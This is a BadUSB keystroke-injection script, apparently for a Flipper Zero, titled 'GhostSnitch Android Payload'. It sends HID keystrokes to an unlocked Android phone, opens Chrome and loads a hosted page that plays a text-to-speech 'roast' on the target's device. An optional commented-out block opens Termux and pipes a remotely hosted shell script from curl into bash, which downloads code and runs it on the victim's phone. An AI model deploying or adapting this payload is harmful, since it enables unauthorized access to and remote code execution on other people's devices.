REM GhostSnitch Android Payload
REM Author: TBJr
REM Version: 3.2
REM Description: Opens Chrome and navigates to the hosted GhostSnitch page
REM
REM REQUIREMENTS:
REM   - Device must be unlocked and on the home screen
REM   - Chrome must be installed (pre-installed on most Android devices)
REM   - The hosted page uses a tap-to-start button, so the target still needs
REM     one tap after the page loads — the TTS roast begins on that tap
REM
REM LIMITATIONS:
REM   - Home-screen search behaviour varies by launcher (Pixel, Samsung, MIUI, etc.)
REM   - Increase DELAY values on slower or older devices
REM   - Android home button is a physical key and cannot be reliably sent via HID;
REM     GUI (Meta/Windows key) is the closest HID equivalent and works on many devices

REM ── Step 1: Press home to ensure we start from the home screen ──────────────
GUI
DELAY 1200

REM ── Step 2: Type "chrome" to trigger the launcher search ────────────────────
REM Most launchers (Pixel, One UI, MIUI) begin filtering installed apps as you type
STRING chrome
DELAY 1800

REM ── Step 3: Open Chrome from search results ──────────────────────────────────
ENTER
DELAY 3500

REM ── Step 4: Focus Chrome's address bar before typing the URL ─────────────────
REM Without CTRL+L the typed URL goes into the page body, not the omnibox
CTRL l
DELAY 600

REM ── Step 5: Type the URL and navigate ────────────────────────────────────────
STRING https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.html
DELAY 400
ENTER

REM ── Done ─────────────────────────────────────────────────────────────────────
REM The page loads and displays a "Tap to Continue" button.
REM The target must tap it once — that tap satisfies Chrome's autoplay policy
REM so the Web Speech API (TTS roast) actually fires.
REM
REM ── Optional: Termux fallback for enhanced features ───────────────────────────
REM Uncomment the block below ONLY if Termux is installed on the target device.
REM Running both methods sequentially will open Chrome AND Termux.
REM
REM GUI
REM DELAY 1200
REM STRING termux
REM DELAY 1500
REM ENTER
REM DELAY 2500
REM STRING bash -c "$(curl -fsSL https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.sh)"
REM ENTER
